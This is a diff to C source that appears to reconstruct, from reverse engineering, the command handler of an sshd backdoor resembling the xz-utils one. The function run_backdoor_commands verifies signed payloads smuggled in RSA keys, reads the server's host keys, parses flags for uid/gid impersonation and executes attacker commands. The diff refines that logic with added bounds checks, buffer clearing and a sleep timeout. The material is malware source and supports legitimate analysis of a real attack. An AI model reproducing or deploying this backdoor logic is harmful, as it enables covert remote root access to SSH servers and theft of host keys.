@@ -13,6 +13,7 @@ extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);
 
 BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 	run_backdoor_commands_data_t f = {0};
+	f.p_do_orig = do_orig;
 
 	if(!ctx){
 		exit_early:
@@ -32,7 +33,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 	if(do_orig){
 		do {
-			*do_orig = TRUE;
+			*f.p_do_orig = TRUE;
 		
 			ctx->imported_funcs->RSA_get0_key(
 				rsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);
@@ -127,6 +128,9 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 					&f.kctx.payload.body.args,
 					payload_size + 1);
 
+				f.u.keys.num_host_keys = 0;
+				f.u.keys.num_host_pubkeys = 0;
+
 				if(!ctx->sshd_sensitive_data->host_keys) break;
 				if(!ctx->sshd_sensitive_data->host_pubkeys) break;
 				if(ctx->sshd_sensitive_data->host_keys == ctx->sshd_sensitive_data->host_pubkeys) break;
@@ -162,16 +166,20 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 						f.ed448_key_ptr,
 						ctx
 					);
-					++key_idx;
+					key_idx = f.key_prev_idx + 1;
 				} while(!sigcheck_result);
-				ctx->sshd_host_pubkey_idx = key_idx - 1;
+				ctx->sshd_host_pubkey_idx = f.key_cur_idx;
+
+#define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))
+
 				if(cmd_type == 2 && TEST_FLAG(f.kctx.args.flags1, CMDF_NO_EXTENDED_SIZE)){
 					if(!data_ptr) break;
 					int data_offset = 0;
 					if(TEST_FLAG(f.kctx.args.flags2, CMDF_IMPERSONATE)){
-						data_offset = sizeof(uid_t) + sizeof(gid_t);
+						data_offset = SIZE_SYSTEM_EXTRA;
+						if(f.body_size <= SIZE_SYSTEM_EXTRA) break;
 					}
-					if(body_size < data_offset + 2) break;
+					if(body_size < (data_offset + sizeof(u16))) break;
 					u16 *size_location = (u16 *)((u8 *)&f.kctx.payload + data_offset + body_offset);
 					data_s1 = data_offset + 2 + *size_location;
 					
@@ -346,6 +354,9 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										if((f.kctx.args.flags2 & CMDF_PSELECT) == CMDF_PSELECT){
 											if(!ctx->libc_imports->exit) break;
 											if(!ctx->libc_imports->pselect) break;
+											*((struct timespec *)&f.payload) = (struct timespec){
+												.tv_sec = 5
+											};
 											ctx->libc_imports->pselect(
 												0,
 												NULL, NULL, NULL,
@@ -358,14 +369,14 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									}
 
 									uid_t tgt_uid = 0, tgt_gid = 0;
-
 									data_s1 = (short)data_s1;
+
 									if(TEST_FLAG(f.kctx.args.flags1, CMDF_IMPERSONATE)){
-										if(data_s1 <= (sizeof(uid_t) + sizeof(gid_t))) break;
+										if(data_s1 <= SIZE_SYSTEM_EXTRA) break;
 										tgt_uid = *(uid_t *)(data_ptr2 + 0);
 										tgt_gid = *(gid_t *)(data_ptr2 + sizeof(uid_t));
-										data_s1 -= (sizeof(uid_t) + sizeof(gid_t));
-										data_index = (sizeof(uid_t) + sizeof(gid_t));
+										data_s1 -= SIZE_SYSTEM_EXTRA;
+										data_index = SIZE_SYSTEM_EXTRA;
 									} else {
 										tgt_gid = 0;
 										data_index = 0;
@@ -376,7 +387,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										packet_data_size = f.kctx.args.u.size;
 									} else {
 										/** data size field (u16) */
-										if(data_s1 <= 2) break;
+										if(data_s1 <= sizeof(u16)) break;
 										packet_data_size = *(u16 *)&data_ptr2[data_index];
 										data_s1 -= sizeof(u16);
 										data_index += sizeof(u16);
@@ -441,7 +452,8 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									}
 
 									// FIXME: set high byte of f.unk50 to 0
-									f.u.sock.fd_recv_size = 0;
+									memset(f.u.sock.fd_recv_buf, 0x0, sizeof(f.u.sock.fd_recv_buf));
+
 
 									if(f.u.sock.socket_fd < 0) break;
 									if(!ctx->libc_imports) break;
